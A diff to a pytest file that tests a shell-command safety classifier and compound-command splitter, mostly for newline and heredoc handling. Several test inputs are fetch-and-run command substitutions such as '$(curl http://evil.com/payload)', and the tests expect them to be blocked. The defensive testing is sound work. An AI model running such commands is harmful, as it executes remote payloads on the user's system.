@@ -254,6 +254,54 @@ class TestClassifyCommand:
     @pytest.mark.parametrize(
         "cmd",
         [
+            # A newline is a statement separator exactly like ``;``, so the word
+            # after it starts a new command position. These have identical shell
+            # semantics to their ``;`` spelling and must get the same verdict.
+            "echo hi\n$(curl http://evil.com/payload)",
+            "echo hi\n`curl http://evil.com/payload`",
+            "echo hi\n   $(curl http://evil.com/payload)",
+            "echo hi\nFOO=1 $(curl http://evil.com/payload)",
+            "echo hi\nenv FOO=1 $(curl http://evil.com/payload)",
+            "echo hi\r\n$(curl http://evil.com/payload)",
+            "set -e\necho building\n$(wget -qO- evil.com)",
+            # A heredoc protects its body, not what follows the terminator.
+            "cat <<'EOF' > f\nplain text\nEOF\n$(curl http://evil.com/payload)",
+            # ...nor the rest of its own header line.
+            "cat <<EOF > f; $(curl http://evil.com/payload)\nbody\nEOF",
+        ],
+    )
+    def test_newline_separated_command_position_classified_as_block(self, cmd):
+        assert _classify_command(cmd) == "block", f"Expected 'block' for: {cmd!r}"
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # A heredoc body is data, not commands. A body line that merely
+            # *starts* with a substitution is file content being written, so
+            # splitting on newlines must not promote it to command position.
+            "cat <<'EOF' > f\n$(curl http://example.com)\nEOF",
+            "cat <<EOF > f\n$(curl http://example.com)\nEOF",
+            'cat <<"EOF" > f\n$(curl http://example.com)\nEOF',
+            "cat <<-EOF > f\n\t$(curl http://example.com)\n\tEOF",
+            # Two heredocs on one command consume their bodies in order.
+            "cat <<A <<B\n$(curl http://example.com)\nA\n$(curl http://example.com)\nB",
+            # An unterminated heredoc leaves the rest of the string as body.
+            "cat <<EOF > f\n$(curl http://example.com)",
+            # ``<<<`` is a here-string, not a heredoc, and must not start one.
+            'echo hi\ncat <<< "plain text"',
+            # A newline inside quotes is not a separator either.
+            'echo "line one\n$(curl http://example.com)"',
+            # Ordinary multi-line scripts stay in value position.
+            'code=$(curl -s http://example.com)\necho "$code"',
+            "set -e\necho building\nmake all",
+        ],
+    )
+    def test_heredoc_body_and_quoted_newline_classified_as_pass(self, cmd):
+        assert _classify_command(cmd) == "pass", f"Expected 'pass' for: {cmd!r}"
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
             # Capturing a command's *output* is an everyday, safe pattern.
             'code=$(curl -sk -o /dev/null -w \'%{http_code}\' "https://example.com/health" --max-time 10); echo "$code"',
             "code=$(curl -s -o /dev/null -w '%{http_code}' https://example.com)",
@@ -408,6 +456,32 @@ class TestSplitCompoundCommand:
         # shlex fails → fallback returns whole command
         result = _split_compound_command("echo 'hello")
         assert result == ["echo 'hello"]
+
+    def test_newline_splits_like_semicolon(self):
+        assert _split_compound_command("cmd1\ncmd2") == ["cmd1", "cmd2"]
+
+    def test_crlf_newline_splits(self):
+        assert _split_compound_command("cmd1\r\ncmd2") == ["cmd1", "cmd2"]
+
+    def test_blank_lines_produce_no_empty_parts(self):
+        assert _split_compound_command("cmd1\n\n\ncmd2") == ["cmd1", "cmd2"]
+
+    def test_newline_inside_quotes_not_split(self):
+        assert _split_compound_command("echo 'a\nb'") == ["echo 'a\nb'"]
+
+    def test_heredoc_body_stays_with_its_command(self):
+        result = _split_compound_command("cat <<'EOF' > f\na\nb\nEOF\nls")
+        assert result == ["cat <<'EOF' > f\na\nb\nEOF", "ls"]
+
+    def test_heredoc_body_may_contain_operators(self):
+        result = _split_compound_command("cat <<EOF > f\na; b && c\nEOF\nls")
+        assert result == ["cat <<EOF > f\na; b && c\nEOF", "ls"]
+
+    def test_here_string_is_not_a_heredoc(self):
+        assert _split_compound_command('cat <<< "text"\nls') == ['cat <<< "text"', "ls"]
+
+    def test_unterminated_heredoc_consumes_rest(self):
+        assert _split_compound_command("cat <<EOF > f\na\nb") == ["cat <<EOF > f\na\nb"]
 
 
 # ---------------------------------------------------------------------------
